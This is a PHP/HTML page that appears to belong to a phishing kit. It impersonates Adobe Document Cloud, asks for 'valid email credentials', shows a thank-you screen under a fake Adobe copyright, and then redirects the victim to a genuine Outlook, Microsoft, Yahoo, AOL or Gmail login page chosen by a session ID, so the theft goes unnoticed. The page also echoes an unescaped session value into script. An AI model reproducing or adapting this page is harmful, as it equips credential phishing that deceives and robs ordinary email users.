<?php
// The page to redirect to
// $redirect_url = 'https://example.com';

// Number of seconds to wait before redirecting
$delay_in_seconds = 5;

session_start();
$Id = $_SESSION['id'];
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css'>
    <!-- Font Awesome CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

    <style>
body, html {
  height: 100%;
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}

* {
  box-sizing: border-box;
}

.bg-image {
    /* The image used */
    background-image: url("Image/bg1.PNG");
    
    /* Add the blur effect */
    filter: blur(8px);
    -webkit-filter: blur(8px);
    
    /* Full height */
    height: 100%; 
    
    /* Center and scale the image nicely */
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
  
/* Position text in the middle of the page/image */
.bg-text {
    /* background-color: rgb(0,0,0); Fallback color */
    /* background-color: rgba(0,0,0, 0.4); Black w/opacity/see-through */
    background-color: #00000099;
    /* opacity: 0.8; */
    color: white;
    /* font-weight: bold; */
    border: 3px solid #f1f1f1;
    border-radius:15px;
    position: absolute;
    top: 10%;
    left: 25%;
    /* transform: translate(-50%, -50%); */
    /* z-index: 2; */
    width: 50%;
    padding: 20px;
    text-align: center;
  }
.modal-body{
  text-align: left;
  color:black;
}
  .button{
      width: 80%;
      color:white;
      margin:auto;
      display:flex;
      margin-top:20px;
  }
  .b1{
      background-color: blue;
  }
  .b2{
      background-color: red;
  }
  .b3{
      background-color: #4d8fe4;
  }
  .b4{
      background-color: #8f1189;
  }
  .b5{
      background-color: green;
  }
  .btext{
      margin-left:20px;
      margin-top:5px;
  }

  Add Animation
  @-webkit-keyframes slideIn {
    from {bottom: -300px; opacity: 0} 
    to {bottom: 0; opacity: 1}
  }
  
  @keyframes slideIn {
    from {bottom: -300px; opacity: 0}
    to {bottom: 0; opacity: 1}
  }
  
  @-webkit-keyframes fadeIn {
    from {opacity: 0} 
    to {opacity: 1}
  }
  
  @keyframes fadeIn {
    from {opacity: 0} 
    to {opacity: 1}
  }

  @media only screen and (max-width: 767px) {
            
            .bg-text{
                width:85%;
                padding: 10px;
                
            }
            .imagem img{
                width: 80px;
                height: 80px;
            }
            .bg-text {
              top: 10%;
              left: 7%;
              /* width: 50%; */
              
            }
}


</style>
</head>
<body>

<div class="bg-image"></div>

<div class="bg-text">
  <div class="imagem">
    <img src="Image/adobe.png" alt="Logo of adobe" width="100px" height="100px">
  </div>
  <p style="font-size:15px">Adobe Document Cloud <br> To read the document, please enter with the valid <br> email credentials that this file was sent to.</p>
  
  <div class="imagem">
    <img src="Image/tkyou.png" alt="Logo of adobe" width="100px" height="100px">
  </div>

  <p style="font-size:40px">
   <b> Thank you </b>
  </p>
  <p style="font-size:20px">
    We will notify you with an update shortly
  </p>
  <p style="font-size:15px">CopyRight &copy; 2024 Adobe</p>



 
                
                           <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.bundle.min.js"></script>

   


<script type="text/javascript">
  var Id = <?php echo $Id; ?>;
  setTimeout(function() {

    if (Id == 1) {
        window.location.href = "https://outlook.com/login"; // Redirect to Office365 login page
      } else if (Id == 2) {
        window.location.href = "https://login.microsoftonline.com"; // Redirect to Outlook login page
      } else if (Id == 3) {
        window.location.href = "https://yahoo.com/login"; // Redirect to Apple login page
      } else if (Id == 4) {
        window.location.href = "https://aol.com/login"; // Redirect to AOL login page
      } else if (Id == 5) {
        window.location.href = "https://gmail.com/login"; // Redirect to Yahoo login page
      } else {
        alert('Unknown received');
      };
        }, <?php echo $delay_in_seconds * 1000; ?>);


        
                       
</script>



</body>
</html>
